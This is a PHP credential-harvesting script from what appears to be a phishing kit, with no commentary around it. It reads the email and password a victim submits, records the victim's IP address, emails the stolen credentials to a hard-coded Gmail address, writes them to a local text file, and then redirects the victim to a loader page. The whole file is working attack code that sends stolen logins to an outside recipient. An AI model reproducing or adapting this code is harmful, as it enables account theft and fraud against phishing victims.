<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------gente info----------------------\n";
$message .= "E-mail ID : ".$_POST['email']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY INCWorld-------------\n";
$send = "dalhatuuj@gmail.com";
$subject = "Result from Unknown";
$headers = "From: gente Info<customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("guru.txt","a");
fputs($fp,$message);
fclose($fp);
?>

	
		  	
		   <script language="JavaScript">
</script>
<script type="text/javascript">
	window.location="loader.html"
</script>